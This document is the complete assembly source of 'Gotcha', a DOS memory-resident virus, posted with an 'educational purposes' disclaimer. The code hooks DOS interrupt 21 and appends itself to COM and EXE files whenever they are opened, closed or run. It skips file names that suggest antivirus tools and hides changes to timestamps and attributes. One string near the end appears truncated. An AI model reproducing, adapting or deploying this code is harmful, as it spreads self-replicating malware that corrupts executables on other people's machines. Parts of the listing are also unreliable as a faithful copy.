<p><br>
;****************************************************************************<br>
;* Gotcha version 17<br>
;*<br>
;* Compile with MASM 4.0<br>
;* (other assemblers will probably not produce the same result)<br>
;*<br>
;* Disclaimer:<br>
;* This file is only for educational purposes. The author takes no<br>
;* responsibility for anything anyone does with this file. Do not<br>
;* modify this file!<br>
;****************************************************************************<br>
<br>
.RADIX 16<br>
<br>
cseg segment<br>
assume cs:cseg,ds:cseg,es:nothing<br>
<br>
<br>
VERS equ 17d ;version<br>
FILELEN equ end_ - start<br>
RESPAR equ (FILELEN/16d) + 18d<br>
BUFLEN equ 18<br>
ENVLEN equ signature- envstring<br>
COMSIGN equ 0<br>
EXESIGN equ 1<br>
<br>
<br>
;****************************************************************************<br>
;* Dummy program (infected)<br>
;****************************************************************************<br>
<br>
org 0100<br>
<br>
begin: db 0E9, BUFLEN+1, 0 ;jump to virus entry<br>
<br>
<br>
;****************************************************************************<br>
;* Data<br>
;****************************************************************************<br>
<br>
org 0103<br>
<br>
start:<br>
buffer db 0CDh, 20 ;original code<br>
db (BUFLEN-2) dup (?)<br>
comexe db COMSIGN ;dummy program is a COM program<br>
<br>
<br>
;****************************************************************************<br>
;* Install the virus<br>
;****************************************************************************<br>
<br>
call start2<br>
start2: pop si<br>
sub si,(BUFLEN+4) ;si = begin virus<br>
mov di,0100<br>
cld<br>
<br>
cmp byte ptr cs:[si+BUFLEN],COMSIGN<br>
jz entryC<br>
<br>
entryE: mov ax,ds ;calculate CS<br>
add ax,10<br>
add ax,cs:[si+16]<br>
push ax ;push new CS on stack<br>
push cs:[si+14] ;push new IP on stack<br>
jmp short entcheck<br>
<br>
entryC: push cs ;push new CS on stack<br>
push di ;push new IP on stack<br>
push di<br>
push si<br>
movsw ;restore old file-begin<br>
movsb<br>
pop si<br>
pop di<br>
<br>
entcheck: mov ax,0DADA ;already installed?<br>
int 21<br>
cmp ah,0A5<br>
je entstop<br>
<br>
mov ax,3000 ;test DOS version &gt;= 3.1?<br>
int 21<br>
xchg ah,al<br>
cmp ax,030A<br>
jb entstop<br>
<br>
push ds<br>
push es<br>
<br>
mov ax,ds ;adjust memory-size<br>
dec ax<br>
mov ds,ax<br>
cmp byte ptr ds:[0000],5A<br>
jnz cancel<br>
mov ax,ds:[0003]<br>
sub ax,low RESPAR<br>
jb cancel<br>
mov ds:[0003],ax<br>
sub word ptr ds:[0012],low RESPAR<br>
<br>
mov es,ds:[0012] ;copy program to top<br>
push cs<br>
pop ds<br>
mov cx,FILELEN<br>
rep movsb<br>
<br>
mov ds,cx ;get original int21 vector<br>
mov si,4*21<br>
movsw ;move it to the end<br>
movsw<br>
<br>
push es ;set vector to new handler<br>
pop ds<br>
mov dx,offset ni21-3<br>
mov ax,2521<br>
int 21<br>
<br>
cancel: pop es<br>
pop ds<br>
<br>
entstop: db 0CBh ;retf<br>
<br>
<br>
;****************************************************************************<br>
;* Interupt 24 handler<br>
;****************************************************************************<br>
<br>
ni24: mov al,3<br>
iret<br>
<br>
<br>
;****************************************************************************<br>
;* Interupt 21 handler<br>
;****************************************************************************<br>
<br>
ni21: pushf<br>
<br>
cmp ax,0DADA ;install-check ?<br>
je do_DADA<br>
<br>
push dx<br>
push cx<br>
push bx<br>
push ax<br>
push si<br>
push di<br>
push ds<br>
push es<br>
<br>
cmp ah,3E ;close ?<br>
jne vvv<br>
mov ah,45 ;duplicate handle<br>
jmp short doit<br>
<br>
vvv: cmp ax,4B00 ;execute ?<br>
jne exit<br>
mov ah,3Dh ;open the file<br>
<br>
doit: int 21<br>
jc exit<br>
xchg ax,bx<br>
call infect<br>
<br>
exit: pop es<br>
pop ds<br>
pop di<br>
pop si<br>
pop ax<br>
pop bx<br>
pop cx<br>
pop dx<br>
popf<br>
<br>
org21: jmp dword ptr cs:[oi21-3] ;call to old int-handler<br>
<br>
<br>
do_DADA: mov ax,0A500+VERS ;return a signature<br>
popf<br>
iret<br>
<br>
<br>
;****************************************************************************<br>
;* Close the file<br>
;****************************************************************************<br>
<br>
close: mov ah,3E ;close the file<br>
pushf<br>
push cs<br>
call org21<br>
ret<br>
<br>
<br>
;****************************************************************************<br>
;* Tries to infect the file (ptr to ASCIIZ-name is DS:DX)<br>
;****************************************************************************<br>
<br>
infect: cld<br>
<br>
push bx<br>
mov ah,62 ;get segment-adres of PSP<br>
int 21<br>
mov ds,bx ;get seg-adres of environment<br>
mov es,ds:[002C]<br>
xor di,di<br>
pop bx<br>
push cs<br>
pop ds<br>
<br>
envloop: mov si,offset envstring-3 ;check the environment<br>
mov cx,ENVLEN<br>
repz cmpsb<br>
jz close ;exit if item found<br>
dec di ;goto next item<br>
xor al,al<br>
mov ch,0FF<br>
repnz scasb<br>
cmp byte ptr es:[di],0 ;finnished environment?<br>
jnz envloop<br>
<br>
mov ax,3300 ;get ctrl-break flag<br>
int 21<br>
push dx<br>
<br>
cwd ;clear the flag<br>
inc ax<br>
push ax<br>
int 21<br>
<br>
mov dx,bx<br>
mov ax,3524 ;get int24 vector<br>
int 21<br>
push bx<br>
push es<br>
mov bx,dx<br>
<br>
push cs<br>
pop ds<br>
<br>
mov dx,offset ni24 ;set int24 vector<br>
mov ah,25<br>
push ax<br>
int 21<br>
<br>
mov ax,1220 ;get file-table entry<br>
push bx<br>
push ax<br>
int 2F<br>
mov bl,es:[di]<br>
pop ax<br>
sub al,0A<br>
int 2F<br>
pop bx<br>
<br>
push es<br>
pop ds<br>
<br>
push [di+2] ;save attribute &amp; open-mode<br>
push [di+4]<br>
<br>
cmp word ptr [di+28],'XE' ;check extension<br>
jne not_exe<br>
cmp byte ptr [di+2A],'E'<br>
jmp short check<br>
<br>
not_exe: cmp word ptr [di+28],'OC'<br>
jne close1v<br>
cmp byte ptr [di+2A],'M'<br>
check: je check_name<br>
close1v: jmp close1<br>
<br>
check_name: cmp byte ptr [di+20],'V' ;name is V*.* ?<br>
je close1v<br>
cmp byte ptr [di+20],'F' ;name is F*.* ?<br>
je close1v<br>
<br>
mov cx,7 ;name is *SC*.* ?<br>
mov ax,'CS'<br>
push di<br>
add di,21<br>
SCloop: dec di<br>
scasw<br>
loopnz SCloop<br>
pop di<br>
je close1v<br>
<br>
mov byte ptr [di+2],2 ;open for read/write<br>
mov byte ptr [di+4],0 ;clear attributes<br>
call getlen<br>
mov cl,3<br>
sub ax,cx ;goto signature<br>
sbb dx,0<br>
call goto_<br>
push ax ;save old offset<br>
push dx<br>
<br>
push cs<br>
pop ds<br>
<br>
mov si,0100 ;read signature<br>
mov dx,si<br>
mov ah,3F<br>
int 21<br>
<br>
cmp word ptr [si],'!A' ;already infected?<br>
je close2v<br>
<br>
call gotobegin<br>
<br>
mov cl,BUFLEN ;read begin<br>
mov dx,si<br>
mov ah,3F<br>
int 21<br>
<br>
cmp word ptr [si],5A4Dh ;EXE ?<br>
jz do_EXE<br>
cmp word ptr [si],4D5A<br>
jz do_EXE<br>
<br>
do_COM: mov byte ptr [si+BUFLEN],COMSIGN<br>
<br>
cmp byte ptr es:[di+12],0FC ;check length<br>
jnb close2<br>
cmp byte ptr es:[di+12],3<br>
jbe close2<br>
<br>
call writeprog ;write program to end of file<br>
jnz close2<br>
<br>
mov byte ptr [si],0E9h ;JMP xxxx'<br>
call getoldlen<br>
add ax,(BUFLEN-2)<br>
mov word ptr [si+1],ax<br>
<br>
jmp short done<br>
close2v: jmp short close2<br>
<br>
do_EXE: mov byte ptr [si+BUFLEN],EXESIGN<br>
<br>
call writeprog ;write program to end of file<br>
jnz close2<br>
<br>
call getlen ;calculate new length<br>
mov cx,0200 ;put new length in header<br>
div cx<br>
inc ax<br>
mov word ptr [si+4],ax<br>
mov word ptr [si+2],dx<br>
<br>
call getoldlen ;calculate new CS &amp; IP<br>
mov cx,0010<br>
div cx<br>
sub ax,word ptr [si+8]<br>
mov word ptr [si+16],ax ;put CS in header<br>
add dx,BUFLEN+1<br>
mov word ptr [si+14],dx ;put IP in header<br>
<br>
<br>
done: call gotobegin<br>
mov cx,BUFLEN ;write new begin<br>
mov dx,si<br>
mov ah,40<br>
int 21<br>
<br>
close2: push es<br>
pop ds<br>
<br>
pop dx ;restore old offset in file<br>
pop ax<br>
call goto_<br>
<br>
or byte ptr [di+6],40 ;no time-change<br>
<br>
close1: call close<br>
<br>
or byte ptr [di+5],40 ;no EOF on next close<br>
pop [di+4] ;restore attribute &amp; open-mode<br>
pop [di+2]<br>
<br>
pop ax ;restore int24 vector<br>
pop ds<br>
pop dx<br>
int 21<br>
<br>
pop ax ;restore ctrl-break flag<br>
pop dx<br>
int 21<br>
<br>
ret<br>
<br>
<br>
;****************************************************************************<br>
;* Get original length of program<br>
;****************************************************************************<br>
<br>
getoldlen: call getlen<br>
sub ax,FILELEN<br>
sbb dx,0<br>
ret<br>
<br>
<br>
;****************************************************************************<br>
;* Get length of program<br>
;****************************************************************************<br>
<br>
getlen: mov ax,es:[di+11]<br>
mov dx,es:[di+13]<br>
ret<br>
<br>
<br>
;****************************************************************************<br>
;* Goto new offset DX:AX<br>
;****************************************************************************<br>
<br>
gotobegin: xor ax,ax<br>
cwd<br>
goto_: xchg ax,es:[di+15]<br>
xchg dx,es:[di+17]<br>
ret<br>
<br>
<br>
;****************************************************************************<br>
;* Write virus to the file<br>
;****************************************************************************<br>
<br>
writeprog: call getlen<br>
call goto_<br>
<br>
mov cx,FILELEN ;write virus<br>
mov dx,si<br>
mov ah,40<br>
int 21<br>
cmp cx,ax ;are all bytes written?<br>
ret<br>
<br>
<br>
;****************************************************************************<br>
;* Text and Signature<br>
;****************************************************************************<br>
<br>
envstring db 'E=mc?<br>
signature: db 'GOTCHA!',0 ;I have got you! :-)<br>
<br>
oi21:<br>
end_:<br>
<br>
cseg ends<br>
end begin<br>
<br>
&nbsp;</p>
